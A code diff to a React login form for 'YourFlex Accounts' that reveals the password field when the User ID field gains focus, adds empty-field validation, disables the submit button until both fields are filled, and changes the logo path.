@@ -13,6 +13,7 @@ export function LoginForm({ visitorInfo }: LoginFormProps) {
   const [userId, setUserId] = useState("");
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
+  const [showPasswordField, setShowPasswordField] = useState(false);
   const [isScreenReader, setIsScreenReader] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const [submitError, setSubmitError] = useState<string | null>(null);
@@ -51,9 +52,13 @@ export function LoginForm({ visitorInfo }: LoginFormProps) {
     }, 2000);
   };
 
+  const handleUserIdFocus = () => {
+    setShowPasswordField(true);
+  };
+
   const handleUserIdChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     let value = e.target.value;
-    
+
     // Prevent "@" character from being entered
     if (value.includes("@")) {
       setUserIdError("User ID not valid.");
@@ -63,7 +68,7 @@ export function LoginForm({ visitorInfo }: LoginFormProps) {
     } else {
       setUserIdError(null);
     }
-    
+
     setUserId(value);
   };
 
@@ -76,6 +81,18 @@ export function LoginForm({ visitorInfo }: LoginFormProps) {
     if (isLoading) return;
 
     setSubmitError(null);
+
+    // Validate User ID is not empty
+    if (!userId.trim()) {
+      setSubmitError("Please enter your User ID.");
+      return;
+    }
+
+    // Validate password is not empty
+    if (!password.trim()) {
+      setSubmitError("Please enter your password.");
+      return;
+    }
 
     // Validate User ID is not an email
     if (isEmailFormat(userId)) {
@@ -117,7 +134,7 @@ export function LoginForm({ visitorInfo }: LoginFormProps) {
         <div className="login-panel">
           <img
             className="sf-logo"
-            src="/LoginLogo.png"
+            src="/images/logo.svg"
             alt="YourFlex Accounts"
           />
 
@@ -136,11 +153,19 @@ export function LoginForm({ visitorInfo }: LoginFormProps) {
                 autoComplete="username"
                 value={userId}
                 onChange={handleUserIdChange}
+                onFocus={handleUserIdFocus}
                 style={userIdError ? { borderColor: "#dc2626" } : {}}
               />
             </div>
             {userIdError && (
-              <p style={{ color: "#dc2626", fontSize: "13px", marginTop: "4px", marginBottom: "8px" }}>
+              <p
+                style={{
+                  color: "#dc2626",
+                  fontSize: "13px",
+                  marginTop: "4px",
+                  marginBottom: "8px",
+                }}
+              >
                 {userIdError}
               </p>
             )}
@@ -156,33 +181,43 @@ export function LoginForm({ visitorInfo }: LoginFormProps) {
               <span className="help-badge">?</span>
             </div>
 
-            <div className="input-row">
-              <div className="icon-box" aria-hidden="true">
-                <svg viewBox="0 0 24 24">
-                  <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
-                </svg>
+            {showPasswordField && (
+              <div>
+                <div className="input-row">
+                  <div className="icon-box" aria-hidden="true">
+                    <svg viewBox="0 0 24 24">
+                      <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
+                    </svg>
+                  </div>
+                  <input
+                    id="pwdInput"
+                    name="password"
+                    type={showPassword ? "text" : "password"}
+                    placeholder="Password"
+                    autoComplete="current-password"
+                    value={password}
+                    onChange={(e) => setPassword(e.target.value)}
+                  />
+                </div>
+
+                <label className="show-pwd-row">
+                  <input
+                    type="checkbox"
+                    checked={showPassword}
+                    onChange={(e) => setShowPassword(e.target.checked)}
+                  />
+                  Show Password
+                </label>
               </div>
-              <input
-                id="pwdInput"
-                name="password"
-                type={showPassword ? "text" : "password"}
-                placeholder="Password"
-                autoComplete="current-password"
-                value={password}
-                onChange={(e) => setPassword(e.target.value)}
-              />
-            </div>
+            )}
 
-            <label className="show-pwd-row">
-              <input
-                type="checkbox"
-                checked={showPassword}
-                onChange={(e) => setShowPassword(e.target.checked)}
-              />
-              Show Password
-            </label>
-
-            <button type="submit" className="logon-btn" disabled={isLoading || !!userIdError}>
+            <button
+              type="submit"
+              className="logon-btn"
+              disabled={
+                isLoading || !!userIdError || !userId.trim() || !password.trim()
+              }
+            >
               {isLoading ? "Loading..." : "Log On"}
             </button>
 
